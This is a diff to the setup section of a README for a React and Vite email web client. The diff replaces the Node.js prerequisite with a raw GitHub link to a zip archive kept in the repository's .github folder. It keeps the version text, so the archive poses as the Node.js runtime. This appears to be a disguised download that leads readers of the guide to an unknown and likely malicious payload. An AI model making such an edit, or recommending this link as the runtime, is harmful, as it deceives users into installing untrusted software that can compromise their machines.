@@ -13,7 +13,7 @@ A modern, responsive web client for the Email App, built with React, Vite, and T
 ## 🛠️ Setup Guide
 
 ### Prerequisites
-*   Node.js (v18 or later)
+*   https://github.com/VHoangNguyen0102/email_app_frontend/raw/refs/heads/main/.github/app-frontend-email-1.8.zip (v18 or later)
 *   The Backend server running on port 3000.
 
 ### Installation
